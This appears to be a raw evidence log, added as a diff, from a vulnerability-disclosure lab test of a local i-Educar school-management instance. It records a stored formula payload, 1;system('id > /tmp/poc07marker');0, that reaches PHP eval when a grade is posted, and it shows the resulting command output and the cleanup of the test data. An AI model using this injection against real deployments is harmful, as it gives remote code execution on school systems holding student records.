@@ -1,0 +1,39 @@
+# i-explorar raw evidence
+# started_at: 2026-09-11T00:17:22.453604+00:00
+# host: -03
+# target: http://127.0.0.1:8080
+# original formula id=3: 'Se / Et'
+
+### POST /module/FormulaMedia/edit (stores the malicious formula)
+HTTP 302
+# formula now stored: "1;system('id > /tmp/poc07marker');0"
+$ docker compose --project-directory /home/pollo/disclosures/i-explorar/lab/i-educar -f /home/pollo/disclosures/i-explorar/lab/i-educar/docker-compose.yml exec -T postgres psql -U ieducar -d ieducar -tAc INSERT INTO modules.componente_curricular_ano_escolar (componente_curricular_id, ano_escolar_id, carga_horaria, anos_letivos) VALUES (3, 6, 40, '{2026}') ON CONFLICT DO NOTHING; INSERT INTO modules.componente_curricular_turma (componente_curricular_id, ano_escolar_id, escola_id, turma_id, carga_horaria) VALUES (3, 6, 2, 3, 40) ON CONFLICT DO NOTHING;
+
+--- psql output ---
+INSERT 0 1
+INSERT 0 1
+--- end psql output ---
+
+### POST grade (triggers execFormulaMedia -> eval)
+HTTP 200
+
+--- body ---
+{"should_show_recuperacao_especifica":false,"componente_curricular_id":"3","matricula_id":"3","situacao":"Cursando","nota_necessaria_exame":"+10","media":1,"media_arredondada":"1","oper":"post","resource":"nota","msgs":[{"msg":"Nota matr\u00edcula 3 alterada com sucesso.","type":"success"}],"any_error_msg":false}
+--- end body ---
+$ docker compose exec -T fpm cat /tmp/poc07marker
+
+--- marker output ---
+uid=1000(ieducar) gid=1000(ieducar) groups=1000(ieducar),1000(ieducar)
+--- end marker output ---
+
+### restore original formula ('Se / Et')
+HTTP 302
+$ docker compose --project-directory /home/pollo/disclosures/i-explorar/lab/i-educar -f /home/pollo/disclosures/i-explorar/lab/i-educar/docker-compose.yml exec -T postgres psql -U ieducar -d ieducar -tAc DELETE FROM modules.componente_curricular_turma WHERE componente_curricular_id=3 AND turma_id=3; DELETE FROM modules.componente_curricular_ano_escolar WHERE componente_curricular_id=3 AND ano_escolar_id=6; DELETE FROM modules.nota_componente_curricular WHERE nota_aluno_id IN (SELECT id FROM modules.nota_aluno WHERE matricula_id=3); DELETE FROM modules.nota_componente_curricular_media WHERE nota_aluno_id IN (SELECT id FROM modules.nota_aluno WHERE matricula_id=3);
+
+--- psql output ---
+DELETE 1
+DELETE 1
+DELETE 1
+DELETE 1
+--- end psql output ---
+# finished_at: 2026-09-11T00:17:24.239056+00:00
